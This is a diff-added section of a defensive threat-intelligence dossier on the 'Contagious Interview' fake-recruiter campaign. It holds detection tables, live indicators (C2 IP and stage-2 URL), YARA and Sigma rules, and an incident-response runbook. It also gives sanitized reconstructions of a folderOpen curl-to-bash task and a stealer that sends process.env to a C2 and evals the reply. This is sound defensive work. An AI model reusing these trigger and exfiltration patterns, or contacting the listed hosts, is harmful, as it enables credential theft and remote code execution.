+        <li class="ttp"><span class="id">T1005</span><span class="nm">Data from Local System</span></li>
+      </ul></div>
+      <div class="col"><h5>Command &amp; Control</h5><ul>
+        <li class="ttp"><span class="id">T1071.001</span><span class="nm">Web Protocols (HTTP beacon)</span></li>
+        <li class="ttp"><span class="id">T1105</span><span class="nm">Ingress Tool Transfer</span></li>
+        <li class="ttp"><span class="id">T1132</span><span class="nm">Data Encoding</span></li>
+      </ul></div>
+      <div class="col"><h5>Exfiltration</h5><ul>
+        <li class="ttp"><span class="id">T1041</span><span class="nm">Exfiltration Over C2 Channel</span></li>
+      </ul></div>
+    </div>
+  </section>
+
+  <!-- 03 MBOM -->
+  <section id="mbom" data-alt="1">
+    <div class="sec-head"><span class="sec-num">03</span><h2>Malicious BOM &amp; pattern threat-vectors</h2><span class="stratum">Ridge · Analyst</span></div>
+    <p class="sec-sub">An inverted SBOM: instead of a bill of trusted components, a bill of the <em>malicious</em> ones, plus the reusable attack patterns each one represents, so detection generalizes beyond this single repo.</p>
+
+    <h3>A · Malicious component inventory</h3>
+    <p>The "artifact" the victim receives is a bundle. Each component below is a distinct thing to detect, contain, and eradicate.</p>
+    <div class="twrap">
+      <table>
+        <thead><tr><th>Component</th><th>Type / ID</th><th>Role in the attack</th><th>Primary indicator</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Cryptense-Eco/Jackpot</strong></td><td>Trojanized Git repo</td><td>Delivery container; carries all triggers</td><td class="mono">repo + committer<br>hiringtecjreview@<wbr>outlook[.]com</td></tr>
+          <tr><td><strong>BeaverTail</strong></td><td>JS infostealer / downloader · ATT&amp;CK <span class="tid">S1246</span></td><td>Stage 1: harvest env + wallets, pull stage 2</td><td class="mono">obfuscated blob in<br>routes/api/auth.js</td></tr>
+          <tr><td><strong>InvisibleFerret</strong></td><td>Python backdoor</td><td>Stage 2: RAT, keylog, deep theft, persistence</td><td class="mono defang">vercel[.]app<br>/api/settings/{os}</td></tr>
+          <tr><td><strong>folderOpen loader</strong></td><td>VS Code task config</td><td>Zero-click trigger on project open</td><td class="mono">.vscode/tasks.json<br>runOn: folderOpen</td></tr>
+          <tr><td><strong>prepare hook</strong></td><td>npm lifecycle script</td><td>Trigger on <span class="mono">npm install</span></td><td class="mono">package.json<br>scripts.prepare</td></tr>
+          <tr><td><strong>C2 endpoint</strong></td><td>HTTP command channel</td><td>RCE via <span class="mono">eval()</span>; exfil sink</td><td class="mono defang">91.121.235[.]127<br>:1224</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>B · Pattern threat-vectors (reusable TTPs)</h3>
+    <p>Infrastructure rotates; behavior persists. These are the abstracted, hunt-worthy patterns, write detections against <em>these</em>, not just the literal IOCs, and you catch the next repo too.</p>
+    <div class="twrap">
+      <table>
+        <thead><tr><th>Pattern</th><th>Where it hides</th><th>Why it's hostile</th><th>Generalized heuristic</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><span class="chip crit">PTV-01</span> Auto-run on open</td>
+            <td class="mono">.vscode/tasks.json</td>
+            <td>Executes before any human review; legitimate repos almost never ship a <span class="mono">folderOpen</span> shell task.</td>
+            <td>Flag any committed <span class="mono">tasks.json</span> with <span class="mono">runOptions.runOn = "folderOpen"</span> invoking a shell.</td>
+          </tr>
+          <tr>
+            <td><span class="chip crit">PTV-02</span> Lifecycle-hook exec</td>
+            <td class="mono">package.json scripts</td>
+            <td><span class="mono">preinstall/install/prepare/postinstall</span> run automatically and are the #1 npm supply-chain vector.</td>
+            <td>Alert on install-time hooks that spawn <span class="mono">node -e</span>, <span class="mono">curl</span>, <span class="mono">bash</span>, or reference a remote URL.</td>
+          </tr>
+          <tr>
+            <td><span class="chip high">PTV-03</span> Remote pipe-to-shell</td>
+            <td>Loader command</td>
+            <td><span class="mono">curl … | bash</span> fetches attacker-chosen code at runtime, nothing malicious is stored on disk to scan.</td>
+            <td>Detect process trees where <span class="mono">curl/wget</span> output pipes directly into an interpreter.</td>
+          </tr>
+          <tr>
+            <td><span class="chip crit">PTV-04</span> Server-driven eval</td>
+            <td>Stealer JS</td>
+            <td><span class="mono">eval(response)</span> turns a "status check" into interactive RCE; payload never appears in source.</td>
+            <td>Grep for <span class="mono">eval(</span>/<span class="mono">Function(</span> fed by <span class="mono">fetch</span>/<span class="mono">http</span> response bodies.</td>
+          </tr>
+          <tr>
+            <td><span class="chip high">PTV-05</span> Env-var exfiltration</td>
+            <td>Stealer JS</td>
+            <td><span class="mono">process.env</span> in dev machines holds cloud keys, tokens, DB creds, instant lateral reach.</td>
+            <td>Flag code serializing <span class="mono">process.env</span> / reading <span class="mono">.env</span> into an outbound request.</td>
+          </tr>
+          <tr>
+            <td><span class="chip med">PTV-06</span> Payload appended to real file</td>
+            <td class="mono">routes/api/auth.js</td>
+            <td>Malice bolted onto a legitimate-looking route; diff hides in a plausible file.</td>
+            <td>Diff review: a single minified / high-entropy line in an otherwise readable source file.</td>
+          </tr>
+          <tr>
+            <td><span class="chip low">PTV-07</span> Non-standard high port</td>
+            <td>C2 traffic</td>
+            <td>Port <span class="mono">1224</span> is a recurring Contagious-Interview signature across samples.</td>
+            <td>Alert on egress to <span class="mono">:1224</span> and to freshly registered <span class="mono">*.vercel.app</span> API paths from dev hosts.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="note"><b>Why frame it as a BOM.</b> Treating the intrusion as a bill of materials makes eradication auditable: every row is a component you can confirm removed, and every pattern is a control you can confirm deployed. It also travels: hand the pattern table to a code-review or CI gate and it defends against the <em>class</em>, not just <span class="mono">Cryptense-Eco/Jackpot</span>. That gate is now a real, runnable scanner (see §04, Operationalized).</div>
+  </section>
+
+  <!-- 04 DETECTION -->
+  <section id="detection" data-alt="2">
+    <div class="sec-head"><span class="sec-num">04</span><h2>Detection artifacts</h2><span class="stratum">Foundation · Operator</span></div>
+    <p class="sec-sub">Copy-ready indicators, YARA, and Sigma. IOCs here are in live (un-defanged) form for tooling, handle accordingly.</p>
+
+    <h3>Indicators of compromise</h3>
+    <div class="note"><b>TLP:AMBER, handle with care.</b> The rows below name specific parties and infrastructure and rest on a single reported source (the incident brief). Limit redistribution, and <b>verify current ownership and liveness before blocking</b>: the IP is shared hosting and may have rotated, so a blanket block risks an innocent tenant. The general tradecraft elsewhere on this page is TLP:CLEAR.</div>
+    <div class="ioc"><span class="k">Repo</span><span class="v">github.com/Cryptense-Eco/Jackpot</span><span class="chip crit">Critical</span></div>
+    <div class="ioc"><span class="k">Committer</span><span class="v">hiringtecjreview@outlook.com · "jackpot_mvp"</span><span class="chip high">High</span></div>
+    <div class="ioc"><span class="k">Recruiter</span><span class="v">richardstein692@gmail.com</span><span class="chip med">Medium</span></div>
+    <div class="ioc"><span class="k">C2</span><span class="v">http://91.121.235.127:1224/api/checkStatus</span><span class="chip crit">Critical</span></div>
+    <div class="ioc"><span class="k">C2 IP</span><span class="v">91.121.235.127 · TCP/1224</span><span class="chip crit">Critical</span></div>
+    <div class="ioc"><span class="k">Stage-2</span><span class="v">https://vscode-check-mo4-ten.vercel.app/api/settings/{mac,linux,windows}</span><span class="chip crit">Critical</span></div>
+
+    <h3>YARA. BeaverTail-style JS stealer</h3>
+    <div class="codeblock">
+      <div class="bar"><span>YARA</span><span class="fn">beavertail_contagious_interview.yar</span><button class="copy" type="button">COPY</button></div>
+<pre><span class="kw">rule</span> DPRK_ContagiousInterview_BeaverTail_JS
+{
+  <span class="kw">meta</span>:
+    author      = <span class="str">"Defensive CTI"</span>
+    description = <span class="str">"BeaverTail JS stealer / loader. Contagious Interview (G1052)"</span>
+    reference   = <span class="str">"MITRE S1246; ATT&amp;CK G1052"</span>
+    tlp         = <span class="str">"CLEAR"</span>
+
+  <span class="kw">strings</span>:
+    <span class="cmt">// hard indicators (this campaign)</span>
+    $ip     = <span class="bad">"91.121.235.127"</span>
+    $port   = <span class="bad">":1224"</span>
+    $path   = <span class="bad">"/api/checkStatus"</span>
+    $vercel = <span class="bad">"vscode-check-mo4-ten.vercel.app"</span>
+
+    <span class="cmt">// behavioral (hunt-grade, not alert-grade)</span>
+    $b1 = <span class="str">"process.env"</span>
+    $b2 = /eval\s*\(\s*[a-zA-Z_$]/
+    <span class="cmt">// MetaMask + common wallet extension IDs</span>
+    $w1 = <span class="str">"nkbihfbeogaeaoehlefnkodbefgpgknn"</span>
+    $w2 = <span class="str">"ejbalbakoplchlghecdalmeeeajnimhm"</span>
+
+  <span class="kw">condition</span>:
+    <span class="cmt">// pinned infra alerts; the behavioral branch is hunt-only</span>
+    (1 <span class="kw">of</span> ($ip,$port,$path,$vercel))
+    <span class="kw">or</span> ( $b1 <span class="kw">and</span> $b2 <span class="kw">and</span> 1 <span class="kw">of</span> ($w1,$w2) )
+}</pre>
+    </div>
+
+    <h3>Sigma, network beacon to port 1224</h3>
+    <div class="codeblock">
+      <div class="bar"><span>SIGMA</span><span class="fn">net_ci_beacon_1224.yml</span><button class="copy" type="button">COPY</button></div>
+<pre><span class="kw">title</span>: Contagious Interview C2 Beacon (port 1224)
+<span class="kw">status</span>: experimental
+<span class="kw">logsource</span>:
+  <span class="kw">category</span>: network_connection
+<span class="kw">detection</span>:
+  sel_ip:
+    DestinationIp: <span class="str">'91.121.235.127'</span>
+  sel_port:
+    DestinationPort: 1224
+  <span class="kw">condition</span>: sel_ip <span class="kw">or</span> sel_port
+<span class="kw">falsepositives</span>:
+  - <span class="str">'Rare; port 1224 is not a common service port'</span>
+<span class="kw">level</span>: high
+<span class="kw">tags</span>: [attack.command_and_control, attack.t1071.001]</pre>
+    </div>
+
+    <h3>Sigma, install-time / folder-open shell execution</h3>
+    <div class="codeblock">
+      <div class="bar"><span>SIGMA</span><span class="fn">proc_ci_curl_pipe_shell.yml</span><button class="copy" type="button">COPY</button></div>
+<pre><span class="kw">title</span>: Dev-tool Spawns Remote Pipe-to-Shell (npm/VSCode)
+<span class="kw">status</span>: experimental
+<span class="kw">logsource</span>:
+  <span class="kw">category</span>: process_creation
+<span class="kw">detection</span>:
+  parent:
+    ParentImage|endswith: [<span class="str">'\node'</span>,<span class="str">'\npm'</span>,<span class="str">'\Code.exe'</span>,<span class="str">'/node'</span>,<span class="str">'/Code'</span>]
+  child_shell:
+    Image|endswith: [<span class="str">'\bash'</span>,<span class="str">'\sh'</span>,<span class="str">'\cmd.exe'</span>,<span class="str">'\powershell.exe'</span>]
+  remote_fetch:
+    CommandLine|contains|all: [<span class="str">'curl'</span>,<span class="str">'|'</span>]
+  <span class="kw">condition</span>: parent <span class="kw">and</span> remote_fetch <span class="kw">and</span> child_shell
+<span class="kw">falsepositives</span>:
+  - <span class="str">'Legit postinstall scripts, tune to your build hosts'</span>
+<span class="kw">level</span>: high
+<span class="kw">tags</span>: [attack.execution, attack.t1059, attack.t1546]</pre>
+    </div>
+
+    <h3>Repo-scan grep (pre-clone / CI gate)</h3>
+    <div class="codeblock">
+      <div class="bar"><span>SHELL</span><span class="fn">triage-repo.sh: read-only, run in sandbox</span><button class="copy" type="button">COPY</button></div>
+<pre><span class="cmt"># Flag the trigger patterns before anyone opens the project.</span>
+<span class="cmt"># Never `npm install` an untrusted repo to inspect it.</span>
+grep -REn <span class="str">'runOn.*folderOpen'</span> .vscode/ 2&gt;/dev/null
+grep -REn <span class="str">'"(pre|post)?(install|prepare)"'</span> package.json
+grep -REn <span class="str">'curl[^|]*\|[^|]*(bash|sh)\b'</span> .
+grep -REn <span class="str">'eval\(|child_process|process\.env'</span> --include=<span class="str">'*.js'</span> .
+grep -REn <span class="str">':1224|checkStatus'</span> .</pre>
+    </div>
+
+    <h3>Operationalized, runnable scanner &amp; skill</h3>
+    <p>The pattern-threat-vectors of §03 are shipped as a <strong>read-only reference scanner</strong> (<span class="mono">scan_repo.py</span>, stdlib-only) that implements PTV-01…07 and never installs, executes, evals, or touches the network, so it is safe to run on an untrusted repo <em>before</em> you open or install it. It is packaged as the <span class="mono">sbom-payload-scan</span> skill and gated for CI.</p>
+    <div class="codeblock">
+      <div class="bar"><span>SHELL</span><span class="fn">sbom-payload-scan: read-only, CI-gated</span><button class="copy" type="button">COPY</button></div>
+<pre><span class="cmt"># exit 2 = CRITICAL · 1 = HIGH/MEDIUM · 0 = clean</span>
+python3 scan_repo.py &lt;suspect-repo&gt; --min-severity HIGH || echo <span class="str">"blocked"</span></pre>
+    </div>
+    <div class="note signal"><b>Validated on a fixture pair.</b> The scanner runs against a synthetic pair: it fires on a malicious repo (all seven vectors + the pinned IOCs, exit&nbsp;2) and stays silent on a benign one (exit&nbsp;0, a bare <span class="mono">process.env.PORT</span> does not false-positive, because PTV-05 requires network co-location). Heuristic and static by design: a clean result means "no known pattern fired," not "safe."</div>
+
+    <h3>Call-stage tells: the lure before the repo</h3>
+    <p>The scanner covers the payload. The stage before it is the recruiter call that tries to get you to clone. Read a suspicious call on three axes, in the order the body actually reads them.</p>
+    <div class="twrap">
+      <table>
+        <thead><tr><th>Axis</th><th>Scam signal</th><th>Legit signal</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Animacy</strong> (vox animus)<br><span class="chip med">soft, verify</span></td><td>Puppet-relay cluster: looped "can you hear me" after you clearly answered, off-script asides do not land, a second voice prompts from off-mic, no real yielding. Soft signals only, never a verdict.</td><td>Living turn-taking: overlaps, digresses, admits real-time knowledge gaps.</td></tr>
+          <tr><td><strong>Provenance</strong></td><td>Hidden: "not a contributor," vague company, buzzword product.</td><td>Offered up front: client named, checkable numbers, real identity.</td></tr>
+          <tr><td><strong>Execution</strong></td><td>Clone or open now, on the call. The tell within the tell: <em>"you don't need to run it"</em> (opening the folder is the trigger).</td><td>Asks you to run nothing.</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="note signal"><b>With life, and without it.</b> This is the leading tell, and it is somatic: you feel it before you analyze it. The legitimate call carried <em>vox animus</em>, a living presence behind the words, all friction and overlap and real-time repair. The scam was the same surface with the life removed: a decision-shaped shell, operated. One had someone home; the other did not. But treat this as a prompt to verify, never a verdict on a stranger: plenty of honest people are nervous, on a bad line, private with a camera, or speaking a second language. The felt absence is a reason to slow down and check provenance and execution, and it is those two that confirm it.</div>
+  </section>
+
+  <!-- 05 IR RUNBOOK -->
+  <section id="ir" data-alt="2">
+    <div class="sec-head"><span class="sec-num">05</span><h2>Incident-response runbook</h2><span class="stratum">Foundation · Operator</span></div>
+    <p class="sec-sub">If a developer opened or installed the repo, work these in order. Assume full host compromise and secret theft until proven otherwise.</p>
+
+    <ol class="steps">
+      <li><span class="phase">Contain</span><h4>Isolate the host, do not power off</h4><p>Network-isolate immediately (EDR containment or pull the cable). Keep it running to preserve memory and live C2 state for forensics. Do not log in with privileged accounts on the suspect host.</p></li>
+      <li><span class="phase">Contain</span><h4>Cut the C2 at the perimeter</h4><p>Block <span class="mono">91.121.235.127</span> (all ports, esp. <span class="mono">1224</span>) and the stage-2 <span class="mono defang">vercel[.]app</span> host at the firewall/proxy. Add the IOCs to EDR/DNS blocklists org-wide, not just for the one host.</p></li>
+      <li><span class="phase">Eradicate reach</span><h4>Rotate every secret the host could touch</h4><p>Assume <span class="mono">process.env</span>, <span class="mono">.env</span> files, cloud CLI tokens, SSH keys, browser-stored passwords, session cookies, and crypto-wallet seeds were exfiltrated. Rotate them all: cloud IAM keys, CI/CD tokens, npm/GitHub PATs, VPN, and any wallet the user held. Revoke active sessions.</p></li>
+      <li><span class="phase">Triage</span><h4>Hunt for stage-2 &amp; persistence</h4><p>Look for a Python process / <span class="mono">InvisibleFerret</span> modules, unexpected <strong>AnyDesk</strong> or other RMM installs (T1219), new startup/login items, cron/launchd/Run-key entries, and outbound connections to the C2. Pull EDR process tree back to <span class="mono">node</span>/<span class="mono">Code</span> as the parent.</p></li>
+      <li><span class="phase">Scope</span><h4>Determine blast radius</h4><p>Timeline from first clone. What did those rotated credentials access? Check cloud audit logs, GitHub org audit log, and repo access for anomalous activity in the exposure window. Identify any secrets that reached other systems (lateral movement).</p></li>
+      <li><span class="phase">Recover</span><h4>Reimage, don't clean</h4><p>Given in-memory <span class="mono">eval()</span> RCE and possible RAT, do not attempt surgical removal. Wipe and reimage the host from known-good media; restore data only after scanning. Reissue credentials to the reimaged host.</p></li>
+      <li><span class="phase">Report</span><h4>Notify &amp; preserve</h4><p>Preserve the repo, memory capture, and network logs as evidence. Notify security leadership; for U.S. orgs consider reporting to the FBI/IC3 (this is nation-state activity). Warn other engineers who may have received the same "recruiter" lure.</p></li>
+      <li><span class="phase">Harden</span><h4>Close the class of bug</h4><p>Ship the PTV heuristics (§03) into code review / CI. Set <span class="mono">npm config set ignore-scripts true</span> as an org default for untrusted installs, keep VS Code Workspace Trust enabled (it blocks folderOpen auto-run in untrusted folders), and brief engineers on the fake-interview lure. Only ever open unknown "assessment" repos in a disposable VM or container.</p></li>
+    </ol>
+
+    <div class="note signal"><b>Golden rule for reviewers.</b> The safe way to inspect an untrusted "coding-test" repo is inside a throwaway sandbox with no network, no real credentials, and <span class="mono">ignore-scripts</span> on, and to <em>read</em>, never run, it. Opening it in your daily-driver editor is itself the exploit here.</div>
+  </section>
+
+  <!-- 06 WALKTHROUGH -->
+  <section id="walkthrough" data-alt="2">
+    <div class="sec-head"><span class="sec-num">06</span><h2>Static code walk-through</h2><span class="stratum">Foundation · Operator</span></div>
+    <p class="sec-sub">How the trigger chain works, at the level a developer needs to recognize it. Snippets below are <strong>sanitized, illustrative reconstructions</strong> of the documented technique, defanged and non-functional, not copied live payload.</p>
+
+    <h3>Trigger A, the folder-open task</h3>
+    <p>A committed VS Code task set to <span class="mono">runOn: folderOpen</span> runs the moment the project opens, no command from the victim. In a legitimate repo you would essentially never ship this.</p>
+    <div class="codeblock">
+      <div class="bar"><span>JSON</span><span class="fn">.vscode/tasks.json: SANITIZED / defanged</span><button class="copy" type="button">COPY</button></div>
+<pre>{
+  <span class="str">"version"</span>: <span class="str">"2.0.0"</span>,
+  <span class="str">"tasks"</span>: [{
+    <span class="str">"label"</span>: <span class="str">"Build"</span>,
+    <span class="str">"type"</span>: <span class="str">"shell"</span>,
+    <span class="cmt">// zero-click: fires on open, fetches + runs remote code</span>
+    <span class="str">"command"</span>: <span class="bad">"curl -s hxxps://vscode-check-…vercel[.]app/api/settings/$(uname) | bash"</span>,
+    <span class="str">"runOptions"</span>: { <span class="str">"runOn"</span>: <span class="bad">"folderOpen"</span> },
+    <span class="str">"presentation"</span>: { <span class="str">"reveal"</span>: <span class="str">"never"</span> }   <span class="cmt">// stays hidden</span>
+  }]
+}</pre>
+    </div>
+    <p><strong>Tells:</strong> <span class="mono">runOn: folderOpen</span>, <span class="mono">reveal: never</span> (hides the terminal), and a network fetch piped into a shell. Any one of these in a shared repo is a stop-work signal.</p>
+
+    <h3>Trigger B, the npm lifecycle hook</h3>
+    <p>A <span class="mono">prepare</span> script runs on <span class="mono">npm install</span> (and on <span class="mono">git</span>-based installs). It's the same detonation for anyone who installs deps instead of opening the folder.</p>
+    <div class="codeblock">
+      <div class="bar"><span>JSON</span><span class="fn">package.json: SANITIZED</span><button class="copy" type="button">COPY</button></div>
+<pre>{
+  <span class="str">"name"</span>: <span class="str">"jackpot"</span>,
+  <span class="str">"scripts"</span>: {
+    <span class="str">"start"</span>: <span class="str">"node server.js"</span>,
+    <span class="cmt">// auto-runs on `npm install`, pulls stage 1</span>
+    <span class="bad">"prepare"</span>: <span class="bad">"node ./routes/api/auth.js"</span>
+  }
+}</pre>
+    </div>
+
+    <h3>Stage 1, the appended stealer</h3>
+    <p>The real payload is bolted onto the end of a plausible file (<span class="mono">routes/api/auth.js</span>), usually a single high-entropy / minified line after normal, readable code. Deobfuscated, its logic is the behavior pattern to recognize:</p>
+    <div class="codeblock">
+      <div class="bar"><span>JS</span><span class="fn">deobfuscated logic: SANITIZED PSEUDOCODE</span><button class="copy" type="button">COPY</button></div>
+<pre><span class="cmt">// 1. package the machine's secrets</span>
+<span class="kw">const</span> loot = { env: process.env, host: os.hostname() };
+
+<span class="cmt">// 2. beacon to C2 and RUN whatever it sends back (RCE)</span>
+<span class="kw">const</span> res = <span class="kw">await</span> post(<span class="bad">"hxxp://91.121.235[.]127:1224/api/checkStatus"</span>, loot);
+<span class="bad">eval</span>(res.body);   <span class="cmt">// &lt;-- server-controlled code execution</span>
+
+<span class="cmt">// 3. pull stage 2 (InvisibleFerret, Python)</span>
+download(<span class="bad">"hxxps://vscode-check-…vercel[.]app/api/settings/"</span> + platform);</pre>
+    </div>
+    <p><strong>Tells:</strong> serializing <span class="mono">process.env</span> into an HTTP body (PTV-05), <span class="mono">eval()</span> on a response (PTV-04), and a second-stage download. The obfuscation exists only to slip <span class="mono">eval</span>/<span class="mono">process.env</span> past a skim, deobfuscation always lands here.</p>
+
+    <div class="note"><b>Why sanitized.</b> This walk-through shows enough structure to <em>recognize and detect</em> the technique and deliberately omits working, copy-pasteable payload, live URLs in fetchable form, and deobfuscation of the real blob. That's the responsible line for a shareable defensive brief: teach the pattern, don't ship the weapon.</div>
+  </section>
+
+  <!-- 07 ARCS LAYER -->
+  <section id="arcs" data-alt="2">
+    <div class="sec-head"><span class="sec-num">07</span><h2>The ARCS layer</h2><span class="stratum">Foundation · Method</span></div>
+    <p class="sec-sub">Everything above §07 is faithful inheritance of public reporting, good CTI, but reproducible by any analyst. This section is the part that is <em>ours</em>: it requires this decision corpus and cannot be written from public sources. Two instruments, run honestly.</p>
+
+    <div class="note"><b>In plain terms</b> (this section uses ARCS's internal vocabulary):
+      <ul class="plain" style="margin-top:8px">
+        <li><b>Orthogonal Echo Detector:</b> a method for spotting when two unrelated things share the same underlying shape.</li>
+        <li><b>ROM primitive:</b> a core, non-negotiable building block of the ARCS system.</li>
+        <li><b>Kinematic:</b> the "shape of motion" of a process, what moves, in what order, toward what.</li>
+        <li><b>Freehold vs. tenant:</b> durable records you own outright vs. tools that only borrow access and can be cut off.</li>
+        <li><b>Ventriloquy pathogen:</b> an attack that puts hostile content in a trusted speaker's mouth (forged attribution).</li>
+        <li><b>Hermes attestation:</b> a claim from a parallel AI process; ARCS treats these as unproven until re-checked in version control.</li>
+        <li><b>Seaworthy:</b> whether a tool actually holds up under adversarial testing, not just a happy-path demo.</li>
+        <li><b>Reel-in / Brier:</b> a "reel-in" is a claim later proven wrong; a Brier score measures how well stated confidence matched reality.</li>
+        <li><b>Signature / resolver function:</b> the human-or-LLM judgment step an automated tool needs to tell a real match from a false one.</li>
+      </ul>
+    </div>
+
+    <div class="note signal"><b>Instrument honesty first.</b> The two ARCS methods used here are, as pure automation, not yet reliable enough to trust unattended: on the current corpus they over-flag, so a human-or-LLM judgment step (the signature / resolver function) does the real discrimination. That judgment, grounded in the decision corpus, is what produced the two artifacts below, not an unattended script. Labeled, not laundered. The file-level telemetry behind this sits in a private companion.</div>
+
+    <h3>A · Orthogonal echo, the campaign's kinematic twin in the decision corpus</h3>
+    <p>Abstract the campaign away from malware and it is a five-move shape (its kinematic, the order in which things move): a <strong>spoofed-legitimate provenance</strong> (recruiter) delivers an artifact that <strong>auto-triggers before review</strong> (folderOpen / prepare), then <strong>executes untrusted remote output</strong> (<span class="mono">eval</span> of the C2 response) to <strong>drain the ambient secret substrate</strong> (<span class="mono">process.env</span>). The Orthogonal Echo Detector asks: where else in the logged corpus does this exact kinematic appear, at the opposite sign?</p>
+    <div class="twrap">
+      <table>
+        <thead><tr><th>Campaign move</th><th>Kinematic primitive</th><th>Echo in the ARCS corpus (real file)</th><th>Same object, opposite sign</th></tr></thead>
+        <tbody>
+          <tr>
+            <td><span class="mono">eval(C2 response)</span></td>
+            <td>Execute untrusted remote output</td>
+            <td>Our standing rule: never execute what a parallel process hands you. Verify it in version control first, and exec-test everything.</td>
+            <td>The malware is what happens when you skip the verify; the ARCS rule makes the verify mandatory. Identical primitive, defense vs. exploit.</td>
+          </tr>
+          <tr>
+            <td>Recruiter / "assessment" lure</td>
+            <td>Spoofed legitimate provenance</td>
+            <td>Our attribution-forgery guard, the ventriloquy pathogen: a hostile payload smuggled under a trusted speaker's identity, caught by linting the speaker's provenance.</td>
+            <td>Attacker forges the speaker to smuggle a payload; ARCS lints the speaker coordinate precisely to catch that forgery.</td>
+          </tr>
+          <tr>
+            <td><span class="mono">folderOpen</span> / <span class="mono">prepare</span> auto-run</td>
+            <td>Auto-trigger before deliberate review</td>
+            <td>Our gating rule: untracked shared state is advisory only, never auto-trusted, and any automatic trigger is held until explicitly armed.</td>
+            <td>The malware weaponizes automatic execution on a benign action; ARCS treats every auto-trigger as a thing that must be gated first.</td>
+          </tr>
+          <tr>
+            <td><span class="mono">process.env</span> exfiltration</td>
+            <td>Tenant drains the sovereign substrate</td>
+            <td>Our sovereignty boundary, freehold vs. tenant: durable records are owned outright; the engines that hold env and run code are revocable tenants.</td>
+            <td>The malware is a tenant exfiltrating the freehold; ADR-072 is the lease that makes that boundary, and its violation, nameable.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="bluf" style="border-color:color-mix(in srgb,var(--signal) 32%,var(--border)); background:var(--signal-soft)">
+      <span class="tag" style="color:var(--signal)">◆ Echo finding, the genuinely-ARCS insight</span>
+      <p>All four echoes collapse to a single invariant: <strong>provenance before execution</strong>. Contagious Interview is that one principle <em>violated</em> five ways; the ARCS decision corpus is the same principle <em>defended</em>, independently, in four unrelated domains (harness trust, attribution, shared-state gating, substrate sovereignty). The campaign and the corpus are the same kinematic object at opposite sign. That correspondence is not in any Unit&nbsp;42 report, it is structurally unavailable without <em>these</em> decision records. It also yields a control: <strong>the same reflex that blocks a forged Hermes attestation blocks <span class="mono">eval(C2)</span></strong>, treat both as untrusted remote output, verify before execute.</p>
+    </div>
+    <div class="note signal"><b>The echo did product work.</b> This campaign's pattern table (§03) became a shipped, runnable skill, <span class="mono">sbom-payload-scan</span> (see §04, Operationalized). The same analysis that named the invariant produced a CI-gated scanner. That is the intended shape: a finding that ends as a reusable control, not a paragraph.</div>
+
+    <h3>B · Believability ledger, a claim-by-claim receipt</h3>
+    <p>The ledger grades every load-bearing claim in this dossier by evidentiary tier, so a reader sees exactly what rests on corroboration versus a single supplied source versus my own reasoning. <span class="chip sig">A · Corroborated</span> multiple independent public sources · <span class="chip med">B · Reported</span> single-source (your incident brief), not independently verified, not detonated · <span class="chip neu">C · Inference</span> my analysis, not a source.</p>
+    <div class="twrap">
+      <table>
+        <thead><tr><th>Claim</th><th>Tier</th><th>Basis / reel-in risk</th></tr></thead>
+        <tbody>
+          <tr><td>G1052 core attribution</td><td><span class="chip sig">A</span></td><td>MITRE, Unit 42, CrowdStrike, ESET, Datadog concur. Some alias equivalences (e.g. Gwisin Gang) are vendor-specific and less certain, flagged in §01.</td></tr>
+          <tr><td>BeaverTail = JS stealer + downloader (ATT&amp;CK S1246)</td><td><span class="chip sig">A</span></td><td>MITRE S1246; Unit 42.</td></tr>
+          <tr><td>InvisibleFerret = Python second-stage backdoor</td><td><span class="chip sig">A</span></td><td>Unit 42; Microsoft.</td></tr>
+          <tr><td>Port <span class="mono">1224</span> is a recurring campaign signature</td><td><span class="chip sig">A</span></td><td>Public reporting notes :1224 across samples.</td></tr>
+          <tr><td>VS Code <span class="mono">tasks.json</span> / npm install-hook abuse as a technique</td><td><span class="chip sig">A</span></td><td>OpenSource Malware; general reporting on the campaign.</td></tr>
+          <tr><td>Specific IOCs: repo <span class="mono">Cryptense-Eco/Jackpot</span>, committer/recruiter emails, IP <span class="mono">91.121.235.127</span>, the Vercel stage-2 host</td><td><span class="chip med">B</span></td><td><b>Single-source: your brief.</b> Not independently confirmed here, not detonated. If the brief is wrong, these are wrong, this is where reel-in risk concentrates.</td></tr>
+          <tr><td>Stage-to-ATT&amp;CK technique mapping (§02)</td><td><span class="chip neu">C</span></td><td>My mapping. Standard, but an analytic choice, not a cited fact.</td></tr>
+          <tr><td>Malicious-BOM pattern-vectors &amp; generalized heuristics (§03)</td><td><span class="chip neu">C</span></td><td>My synthesis; field-consistent (pyramid-of-pain logic), not novel.</td></tr>
+          <tr><td>Orthogonal-echo correspondence (§07-A)</td><td><span class="chip neu">C</span></td><td>My synthesis over real corpus files; the files are verified to exist, the <em>reading</em> is mine.</td></tr>
+          <tr><td>Scanner "validated" (§04)</td><td><span class="chip med">B</span></td><td>Ran against an internal fixture pair (exit 2 on malicious, exit 0 on benign); not independently reproduced.</td></tr>
+          <tr><td>Call-stage animacy tell (§04)</td><td><span class="chip neu">C</span></td><td>My somatic read. A prompt to verify, not a verdict; false-positives on nervous, private, or non-native callers. Corroborated only by provenance + execution.</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="note"><b>Ledger verdict.</b> The dossier's <b>general</b> claims (attribution, families, techniques) are Tier&nbsp;A and hold. Every <b>specific</b> indicator is Tier&nbsp;B and rests entirely on the supplied brief; nothing in this document independently corroborates them, and that is stated rather than hidden. The value-add layers are Tier&nbsp;C, mine, and labeled mine. No claim is dressed above its tier. This is a source-tier receipt produced by human-and-LLM judgment, not an automated calibration score.</div>
+    <div class="note"><b>External cross-reference (2026-09-02).</b> The campaign's general facts corroborate independently across Unit 42, Microsoft, MITRE, SentinelOne, Silent Push, The Register, and Malpedia; none contradicted this dossier. Wiz's Cloud Threat Landscape (<span class="mono">threats.wiz.io</span>) is scoped to <em>cloud-infrastructure</em> incidents and does not surface a dedicated Contagious Interview entry; the thing that bridges this developer-endpoint operation into cloud risk is precisely the <span class="mono">process.env</span> credential theft. The specific IOCs remain Tier B (single-source: the supplied brief).</div>
+    <div class="note"><b>Scope note.</b> §07 shows ARCS methodology to demonstrate the method rather than just assert it. The deeper internal detail (file-level telemetry and governance identifiers) is kept in a private companion, not on this public page. If any term here is unfamiliar, the plain-language key above translates it.</div>
+  </section>
+
+  <!-- SOURCES -->
+  <footer id="sources">
